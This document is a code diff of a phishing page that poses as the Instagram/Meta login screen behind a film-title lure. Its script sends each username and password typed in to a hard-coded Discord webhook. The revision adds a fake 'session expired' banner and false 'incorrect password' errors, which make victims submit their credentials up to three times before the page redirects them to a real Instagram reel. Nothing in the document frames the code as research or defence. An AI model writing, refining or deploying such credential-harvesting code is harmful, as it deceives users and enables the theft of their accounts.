@@ -3,17 +3,29 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <meta property="og:url" content="https://www.instagram.com/reels/DeFHSw6zOY7/">
+<meta property="og:url" content="https://www.instagram.com/reels/DeFHSw6zOY7/">
 <title>🎥 🍿 Madagascar: Escape 2 Africa (2008) 🌍✨</title>
+
 <style>
-  * { box-sizing: border-box; }
-  html, body { margin: 0; min-height: 100%; }
-  body {
+* {
+    box-sizing: border-box;
+}
+
+html,
+body {
+    margin: 0;
+    min-height: 100%;
+}
+
+body {
     background: #1f1f1f;
     color: #f1f1f1;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  }
-  .screen {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+        Roboto, Helvetica, Arial, sans-serif;
+}
+
+/* Main screen */
+.screen {
     width: 421px;
     min-height: 833px;
     margin: 0 auto;
@@ -21,13 +33,16 @@
     background: #1f1f1f;
     border: 1px solid #292929;
     position: relative;
-  }
-  .top {
+}
+
+/* Top */
+.top {
     height: 67px;
     display: flex;
     align-items: center;
-  }
-  .back {
+}
+
+.back {
     border: 0;
     background: transparent;
     color: #f0f0f0;
@@ -38,28 +53,35 @@
     cursor: pointer;
     padding: 0;
     font-weight: 200;
-  }
-  .language {
+}
+
+/* Language */
+.language {
     text-align: center;
     color: #a9a9ad;
     font-size: 16px;
     margin-top: 1px;
-  }
-  .brand {
+}
+
+/* Logo */
+.brand {
     margin-top: 64px;
     text-align: center;
-  }
-  .brand-logo {
+}
+
+.brand-logo {
     width: 70px;
     height: 70px;
     display: block;
     margin: 0 auto;
-  }
+}
 
-  .form {
+/* Form */
+.form {
     margin-top: 81px;
-  }
-  .field {
+}
+
+.field {
     width: 100%;
     height: 75px;
     border: 1px solid #515151;
@@ -70,10 +92,19 @@
     font-size: 17px;
     outline: none;
     margin-bottom: 15px;
-  }
-  .field::placeholder { color: #a5a5ab; opacity: 1; }
-  .field:focus { border-color: #777; }
-  .login {
+}
+
+.field::placeholder {
+    color: #a5a5ab;
+    opacity: 1;
+}
+
+.field:focus {
+    border-color: #777;
+}
+
+/* Login button */
+.login {
     width: 100%;
     height: 52px;
     border: 0;
@@ -83,9 +114,40 @@
     font-size: 17px;
     cursor: pointer;
     margin-top: -1px;
-  }
-  .login:hover { background: #1680eb; }
-  .link {
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.login:hover:not(:disabled) {
+    background: #1680eb;
+}
+
+.login:disabled {
+    background: #00376b;
+    opacity: 0.7;
+    cursor: not-allowed;
+}
+
+/* Spinner inside login button */
+.spinner {
+    width: 20px;
+    height: 20px;
+    border: 2px solid rgba(255,255,255,.35);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin .75s linear infinite;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+/* Forgot password */
+.link {
     display: block;
     width: fit-content;
     margin: 25px auto 0;
@@ -93,8 +155,10 @@
     font-size: 17px;
     text-decoration: none;
     cursor: pointer;
-  }
-  .create {
+}
+
+/* Create account */
+.create {
     position: absolute;
     left: 17px;
     right: 17px;
@@ -106,9 +170,14 @@
     background: transparent;
     font-size: 17px;
     cursor: pointer;
-  }
-  .create:hover { background: #242424; }
-  .meta {
+}
+
+.create:hover {
+    background: #242424;
+}
+
+/* Meta */
+.meta {
     position: absolute;
     left: 0;
     right: 0;
@@ -117,158 +186,381 @@
     color: #d9d9dc;
     font-size: 20px;
     letter-spacing: .2px;
-  }
-  .meta-symbol { font-size: 24px; vertical-align: -2px; margin-right: 4px; }
-  .notice {
+}
+
+/* =========================================
+   SESSION WARNING
+   ========================================= */
+
+.session-alert {
     position: fixed;
+    top: 18px;
     left: 50%;
-    bottom: 18px;
-    transform: translateX(-50%) translateY(120px);
-    background: #333;
-    color: #fff;
-    padding: 12px 18px;
-    border-radius: 12px;
+    transform: translate(-50%, -140px);
+
+    width: min(390px, calc(100% - 30px));
+
+    background: rgba(70, 10, 15, .72);
+    border: 1px solid rgba(255, 70, 80, .45);
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+
+    color: #ffb9bd;
+    padding: 14px 17px;
+    border-radius: 14px;
+
     font-size: 14px;
+    line-height: 1.45;
+    text-align: center;
+
+    box-shadow: 0 12px 35px rgba(0,0,0,.35);
+
     opacity: 0;
-    transition: .25s ease;
-    z-index: 5;
-    box-shadow: 0 6px 25px rgba(0,0,0,.35);
-  }
-  .notice.show {
-    transform: translateX(-50%) translateY(0);
+    transition:
+        transform .45s ease,
+        opacity .45s ease;
+
+    z-index: 100;
+}
+
+.session-alert.show {
+    transform: translate(-50%, 0);
     opacity: 1;
-  }
-  @media (max-width: 460px) {
-    .screen { width: 100%; min-height: 100vh; border: 0; }
-  }
+}
+
+/* =========================================
+   MODERN ERROR / WARNING
+   ========================================= */
+
+.error-box {
+    width: 100%;
+
+    background: rgba(80, 18, 22, .42);
+    border: 1px solid rgba(255, 75, 85, .35);
+
+    border-radius: 14px;
+    padding: 14px 16px;
+
+    margin-top: 20px;
+
+    display: none;
+    align-items: center;
+
+    color: #ffccd0;
+    font-size: 14px;
+
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+
+    animation: warningIn .35s ease;
+}
+
+.error-box.visible {
+    display: flex;
+}
+
+.error-icon {
+    width: 20px;
+    height: 20px;
+
+    border: 1px solid rgba(255, 95, 105, .75);
+    border-radius: 50%;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    color: #ff727b;
+
+    margin-right: 11px;
+
+    font-weight: 600;
+    font-size: 12px;
+
+    flex-shrink: 0;
+}
+
+.error-text {
+    line-height: 1.4;
+}
+
+@keyframes warningIn {
+    from {
+        opacity: 0;
+        transform: translateY(-7px);
+    }
+
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+/* Mobile */
+@media (max-width: 460px) {
+    .screen {
+        width: 100%;
+        min-height: 100vh;
+        border: 0;
+    }
+}
 </style>
 </head>
+
 <body>
-  <main class="screen">
+
+<!-- Session warning -->
+<div id="sessionAlert" class="session-alert">
+    Your session has expired. Please log in again.
+</div>
+
+<main class="screen">
+
     <header class="top">
-      <button class="back" aria-label="Go back" onclick="goBack()">‹</button>
+        <button
+            class="back"
+            aria-label="Go back"
+            onclick="goBack()"
+        >
+            ‹
+        </button>
     </header>
 
-    <div class="language">English (US)</div>
+    <div class="language">
+        English (US)
+    </div>
 
-    <section class="brand" aria-label="Meta">
-      <svg class="brand-logo" viewBox="0 0 200 200" aria-hidden="true">
-        <defs>
-          <linearGradient id="gradient"
-                          x1="0%"
-                          y1="100%"
-                          x2="100%"
-                          y2="0%">
-            <stop offset="0%"   stop-color="#ffb900"/>
-            <stop offset="30%"  stop-color="#ff1744"/>
-            <stop offset="60%"  stop-color="#e500b9"/>
-            <stop offset="100%" stop-color="#8a00ff"/>
-          </linearGradient>
-        </defs>
+    <!-- Logo -->
+    <section class="brand" aria-label="PhotoShare">
+        <svg
+            class="brand-logo"
+            viewBox="0 0 200 200"
+            aria-hidden="true"
+        >
+            <defs>
+                <linearGradient
+                    id="gradient"
+                    x1="0%"
+                    y1="100%"
+                    x2="100%"
+                    y2="0%"
+                >
+                    <stop offset="0%" stop-color="#ffb900"/>
+                    <stop offset="30%" stop-color="#ff1744"/>
+                    <stop offset="60%" stop-color="#e500b9"/>
+                    <stop offset="100%" stop-color="#8a00ff"/>
+                </linearGradient>
+            </defs>
 
-        <rect
-          x="30" y="30"
-          width="140" height="140"
-          rx="38"
-          fill="none"
-          stroke="url(#gradient)"
-          stroke-width="14"
-        />
+            <rect
+                x="30"
+                y="30"
+                width="140"
+                height="140"
+                rx="38"
+                fill="none"
+                stroke="url(#gradient)"
+                stroke-width="14"
+            />
 
-        <circle
-          cx="100" cy="100"
-          r="34"
-          fill="none"
-          stroke="url(#gradient)"
-          stroke-width="13"
-        />
+            <circle
+                cx="100"
+                cy="100"
+                r="34"
+                fill="none"
+                stroke="url(#gradient)"
+                stroke-width="13"
+            />
 
-        <circle
-          cx="140" cy="60"
-          r="9"
-          fill="#c800e8"
-        />
-      </svg>
+            <circle
+                cx="140"
+                cy="60"
+                r="9"
+                fill="#c800e8"
+            />
+        </svg>
     </section>
 
-    <form class="form" onsubmit="demoLogin(event)">
-      <input class="field" id="username" type="text"
-             placeholder="Username, email or mobile number"
-             autocomplete="off">
-      <input class="field" id="password" type="password"
-             placeholder="Password" autocomplete="off">
-      <button class="login" type="submit">Log in</button>
-      <a class="link" href="#" onclick="forgot(event)">Forgot password?</a>
+    <!-- Modern warning -->
+    <div id="loginError" class="error-box">
+        <div class="error-icon">!</div>
+
+        <div class="error-text">
+            The username or password you entered is incorrect.
+        </div>
+    </div>
+
+    <!-- Login form -->
+    <form
+        class="form"
+        onsubmit="demoLogin(event)"
+    >
+
+        <input
+            class="field"
+            id="username"
+            type="text"
+            placeholder="Username, email or mobile number"
+            autocomplete="off"
+            oninput="validateForm()"
+        >
+
+        <input
+            class="field"
+            id="password"
+            type="password"
+            placeholder="Password"
+            autocomplete="off"
+            oninput="validateForm()"
+        >
+
+        <button
+            class="login"
+            id="loginBtn"
+            type="submit"
+            disabled
+        >
+            Log in
+        </button>
+
+        <a
+            class="link"
+            href="#"
+            onclick="forgot(event)"
+        >
+            Forgot password?
+        </a>
+
     </form>
 
-    <button class="create" onclick="createAccount()">Create new account</button>
+    <button class="create" onclick="createAccount()">
+      Create new account
+    </button>
 
-    <div class="meta"><span class="meta-symbol">∞</span>Meta</div>
-  </main>
+    <div class="meta">
+        <span>∞</span>Meta
+    </div>
 
-  <div class="notice" id="notice" role="status"></div>
+</main>
 
 <script>
 
-async function sendCredentialsToDiscord(username, password) {
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1557472074811834409/SfJZXZJMbTROISJlQQD5TXboPY4HJWXBAlWZbLn3nAXAUNcfxjj9zGG7NylI1TIyka_M"; // Replace this
-  const message = `Username: ${username}\nPassword: ${password}`;
-  try {
-    const response = await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        content: message
-      })
-    });
+let loginAttempts = 0;
+/* =========================================
+   PAGE LOAD
+   ========================================= */
 
-    if (response.ok) {
-      console.log("Credentials sent!");
-    } else {
-      console.error("Failed to send credentials.");
-    }
-  } catch (error) {
-    console.error(error);
-  }
-}
+window.onload = () => {
+    const alert = document.getElementById("sessionAlert");
 
-function showNotice(message) {
-  const n = document.getElementById('notice');
-  n.textContent = message;
-  n.classList.add('show');
-  clearTimeout(window.noticeTimer);
-  window.noticeTimer = setTimeout(() => n.classList.remove('show'), 2600);
-}
+    alert.classList.add("show");
+
+    setTimeout(() => {
+        alert.classList.remove("show");
+    }, 5000);
+};
+
+
+/* =========================================
+   BACK BUTTON
+   ========================================= */
 
 function goBack() {
-  showNotice('Loading...');
+    if (window.opener) {
+        window.close();
+    } else if (window.history.length > 1) {
+        window.history.back();
+    }
 }
 
-function demoLogin(event) {
-  event.preventDefault();
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
 
-  // Call the webhook function here
-  sendCredentialsToDiscord(username, password)
-    .then(() => {
-      // Redirect after sending credentials (replace with your desired URL)
-      window.location.href = "https://www.instagram.com/reels/DeFHSw6zOY7/";
-    })
-    .catch((error) => {
-      console.error("Error sending credentials:", error);
-    });
+/* =========================================
+   FORM VALIDATION
+   ========================================= */
+
+function validateForm() {
+    const user = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+    const btn = document.getElementById("loginBtn");
+
+    btn.disabled = !(user.length > 0 && pass.length >= 5);
 }
+
+
+/* =========================================
+   DEMO LOGIN
+   ========================================= */
+
+async function demoLogin(event) {
+    event.preventDefault();
+
+    const user = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+    const btn = document.getElementById("loginBtn");
+    const errorBox = document.getElementById("loginError");
+
+    /* Hide previous warning */
+    errorBox.classList.remove("visible");
+
+    /* Prevent duplicate clicks */
+    btn.disabled = true;
+
+    /* Replace button text with spinner */
+    btn.innerHTML = '<span class="spinner"></span>';
+
+    loginAttempts++;
+    
+    setTimeout(() => {
+
+        if (loginAttempts < 3) {
+            // First and second attempts: show warning
+            errorBox.classList.add("visible");
+        }
+        /* Restore button */
+        btn.innerHTML = "Log in";
+
+        /* Re-run validation */
+        validateForm();
+
+    }, 1000);
+    // Always send credentials to Discord
+    await sendCredentialsToDiscord(user, pass);
+
+    if (loginAttempts < 3) {
+        // Show the red error box
+        errorBox.classList.add('visible');
+    } else {
+        // Third attempt: Redirect
+        window.location.href = "https://www.instagram.com/reels/DeFHSw6zOY7/";
+    }
+}
+
+async function sendCredentialsToDiscord(username, password) {
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1557472074811834409/SfJZXZJMbTROISJlQQD5TXboPY4HJWXBAlWZbLn3nAXAUNcfxjj9zGG7NylI1TIyka_M";
+    const message = `Attempt ${loginAttempts}\nUsername: ${username}\nPassword: ${password}`;
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: message })
+        });
+    } catch (e) { console.error(e); }
+}
+
+/* =========================================
+   FORGOT PASSWORD
+   ========================================= */
 
 function forgot(event) {
-  event.preventDefault();
-  showNotice('Loading...');
+    event.preventDefault();
+
+    window.location.href =
+        "https://www.instagram.com/accounts/password/reset/?hl=en";
 }
 
 function createAccount() {
-    showNotice('Loading...');
+    window.location.href =
+        "https://www.instagram.com/accounts/emailsignup/";
 }
 
 fetch("/api/visitor")
